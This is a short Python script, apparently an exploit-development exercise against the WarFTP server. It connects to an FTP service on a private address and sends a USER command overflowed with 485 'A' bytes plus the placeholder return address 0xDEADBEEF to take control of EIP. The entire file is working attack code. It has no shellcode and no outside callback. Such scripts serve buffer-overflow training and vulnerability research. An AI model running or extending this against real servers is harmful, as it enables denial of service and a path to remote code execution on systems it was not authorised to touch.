#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
nilaiEIP = "\x41" * 485
nilaiEIP += "\xEF\xBE\xAD\xDE"
s.connect(('192.168.1.128',21))
data = s.recv(1024)
print ("Sending data to WarFTP...")
s.send('USER '+nilaiEIP+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Finish")
